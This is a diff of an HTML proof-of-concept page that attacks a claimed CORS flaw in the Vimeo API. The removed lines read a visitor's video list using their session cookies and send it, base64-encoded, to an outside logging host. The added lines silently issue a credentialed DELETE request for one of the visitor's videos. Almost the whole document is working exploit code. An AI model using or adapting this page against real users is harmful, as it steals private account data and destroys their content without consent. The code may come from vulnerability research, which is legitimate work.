@@ -1,32 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Vimeo CORS Data Theft PoC</title>
+  <title>Vimeo CORS Destructive Action PoC</title>
 </head>
 <body>
-<h1>Data Theft PoC</h1>
-<pre id="output"></pre>
+<h1>Destructive Action PoC</h1>
+<p>This will attempt to delete one of your videos silently.</p>
 
 <script>
 (async () => {
   try {
-    // Replace with your own user ID
-    const userId = "245175900";  
+    // Replace with a video ID from your test account
+    const videoId = "987654321";  
 
-    const resp = await fetch(`https://api.vimeo.com/users/${userId}/videos`, {
-      credentials: "include"  // sends Vimeo cookies
+    const resp = await fetch(`https://api.vimeo.com/videos/${videoId}`, {
+      method: "DELETE",
+      credentials: "include"
     });
 
-    const text = await resp.text();
-
-    // Show it on the page for proof
-    document.getElementById("output").innerText = text;
-
-    // Exfiltrate to your server/logging endpoint
-    await fetch("https://russianyandexshop.github.io/view/log?d=" + encodeURIComponent(btoa(text)));
+    alert("DELETE request sent! Response status: " + resp.status);
 
   } catch (e) {
-    document.getElementById("output").innerText = "Error: " + e;
+    alert("Error: " + e);
   }
 })();
 </script>
